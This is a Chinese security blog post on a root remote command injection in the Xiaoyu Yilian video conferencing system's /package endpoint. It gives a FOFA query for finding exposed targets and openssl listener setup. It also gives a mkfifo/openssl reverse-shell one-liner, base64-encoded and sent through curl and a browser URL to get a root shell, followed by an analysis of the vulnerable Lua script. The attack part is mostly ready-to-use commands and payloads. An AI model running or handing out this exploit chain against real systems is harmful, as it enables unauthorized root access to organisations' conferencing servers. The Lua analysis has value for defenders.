> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iCHikHfJZBjNYr-950gKJA)

**上来就 fofa 大法：**

```
title="云视讯管理平台"
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDUjWrXBH3Xhbjxlew2fjJ7ib4OLKn1NhRxNcXalnZIUEa7c6AghnOTPuVDKswD2SsR1YRDytacO3Q/640?wx_fmt=jpeg)

找到页面了之后寻找该该系统的 OpenReaty 页面，一般都在其他端口上。  

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDUjWrXBH3Xhbjxlew2fjJ7ToruG4lFXhUFBauTDIjDv4gRt7muLEFcTkbGKyuXvn8ibG8PtHzsMNw/640?wx_fmt=png)

**漏洞特征：**

**通过访问 “/package?path=`Liunx 命令 `” 可直接构造远程代码执行。**

**漏洞原理：**

**“小鱼易连视频会议系统”LUA 脚本权限分配不当, 导致任意用户可利用 root 权限执行命令**

**复现全过程：**

本地进行 openssl 监听：

1、生成证书：

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

2、进行监听：

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```

3、构造反弹 shell 命令

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/s; rm /tmp/s
```

```
命令解释：
1.mkfifo是创建一个命名管道，创建好了以后/tmp/s内容是空的
2.然后不断执行那个bash反弹的命令，连接的地址从步骤1的文件里取
3.找那个443连接往步骤1里的文件写入内容，估计是ip和端口
4.最后shell弹好了就删除步骤1的文件
```

4、构造 “package?path=” 路径下命令执行语句，将上面反弹 shell 命令进行 base64 加密。

开始攻击：

1、请求目机机器上执行命令有三种方法：

```
curl：curl "http://ip/package?path=`echo bWtmaWZvIC90bXAvczsvYmluL2Jhc2ggLWkgPCAvdG1wL3MgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMC42Mi45Ni4yMzY6ODg4ID4gL3RtcC9zO3JtIC1mIC90bXAvcw== | base64 -d | sh`"
```

2、直接 web 上面请求：

```
http://ip/package?path=echo bWtmaWZvIC90bXAvczsvYmluL2Jhc2ggLWkgPCAvdG1wL3MgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMC42Mi45Ni4yMzY6ODg4ID4gL3RtcC9zO3JtIC1mIC90bXAvcw== | base64 -d | sh
```

3、burp 抓包拦截请求，同 web 一样。

bp 抓上面的请求会返回 302，然后跳转 404, 不要慌，这时候去看你的监听服务器

监听服务器返回 shell，直接 root 权限

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDUjWrXBH3Xhbjxlew2fjJ7InhqUruF4casAqib5wY2hI5IEicaicibolf8EGMs4ox6TKsvfDC2U4L12Q/640?wx_fmt=png)

接下来详细分析：  

找机器来验证，环境为 docker，上机查看：

```
netstat -anvp | grep :80
```

返回结果如下：

```
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      16554/nginx: mas
```

运行在 80 端口的程序为 nginx，在宿主机中寻找 nginx 程序

```
find / -name nginx
```

发现宿主机中没有运行 nginx

于是尝试进入 k8s 中的容器寻找响应服务

```
docker ps | grep openresty
```

结果如下：  

```
b61e91356e49    "/usr/local/openresty"
```

最终在 k8s 中的 openresty 容器中发现了 nginx 程序 /usr/local/openresty/nginx，查询 nginx 配置文件，发现配置文件当中引用了一行 lua 脚本：

```
location = /package {
                proxy_set_header Host $host:$server_port;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Nginx-IP $server_addr;
                limit_req zone=normalfrequ burst=20 nodelay;
                content_by_lua_file lua/package.lua;
          }
```

查询该文件并查看文件内容 cat /usr/local/openresty/nginx/lua/package.lua

```
local package_absolute_path = '/var/log/logs.tar.gz'
local path = ngx.req.get_uri_args().path
if nil == path then
    path = '/logs'
end

os.execute('rm -rf ' .. package_absolute_path)
os.execute('tar -zcvPf ' .. package_absolute_path .. ' ' .. path)
ngx.redirect('/log/logs.tar.gz?' .. os.time())
print('rm -rf ' .. package_absolute_path)
os.execute('rm -rf ' .. package_absolute_path)
return
```

仔细研究发现在配置文件中直接对 path 参数传入的字符串与 rm -rf 等命令进行拼接，没有进行文件白名单等过滤，攻击者可以通过构造特殊字符串对命令进行闭合，从而造成 Linux 命令注入，公网大多已修复后才进行爆出。

谨记网络安全法，切勿用于非法用途

公众号

最后再给大家介绍一下漏洞库，地址：wiki.xypbk.com  

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAMOicC5b9zVDyfybStngExBMSTicgTjNIOd4cSIroia7ae82ZJvdibclGltrgjdJLzugk276Q9xkonYw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAMOicC5b9zVDyfybStngExBn4bcIUDNGtN3mHLSSNiabKm9LPwxmb4qeq5Jbk6COGnLbgr5Rt2POmA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAMOicC5b9zVDyfybStngExBkevFiamAkVDFhgFopA50dnUI98AAo6nXuuTC5DpeKS6BneWtTpWu7ew/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibAMOicC5b9zVDyfybStngExBx4lpIiahQIj3G9Y3cpiaaqLFIN5EtlrDlkb1Sqnm40wtVYcWof1bSOXw/640?wx_fmt=png)

本站暂不开源，因为想控制影响范围，若因某些人乱搞，造成了严重后果，本站将即刻关闭。

漏洞库内容来源于互联网 && 零组文库 &&peiqi 文库 && 自挖漏洞 && 乐于分享的师傅，供大家方便检索，绝无任何利益。  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。

若有愿意分享自挖漏洞的佬师傅请公众号后台留言，本站将把您供上，并在此署名，天天烧香那种！

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8Yzhia63knJ4QJFvO4WBfd6KQazjtuPC7uqNBt5gE06ia7GjOVn2RFOicNA/640?wx_fmt=jpeg)

扫取二维码获取

更多精彩

![](https://mmbiz.qpic.cn/mmbiz_png/TlgiajQKAFPtOYY6tXbF7PrWicaKzENbNF71FLc4vO5nrH2oxBYwErfAHKg2fD520niaCfYbRnPU6teczcpiaH5DKA/640?wx_fmt=png)

Qingy 之安全  

![](https://mmbiz.qpic.cn/mmbiz_png/Y8TRQVNlpCW6icC4vu5Pl5JWXPyWdYvGAyfVstVJJvibaT4gWn3Mc0yqMQtWpmzrxibqciazAr5Yuibwib5wILBINfuQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3pKe8enqDsSibzOy1GzZBhppv9xkibfYXeOiaiaA8qRV6QNITSsAebXibwSVQnwRib6a2T4M8Xfn3MTwTv1PNnsWKoaw/640?wx_fmt=png)

点个在看你最好看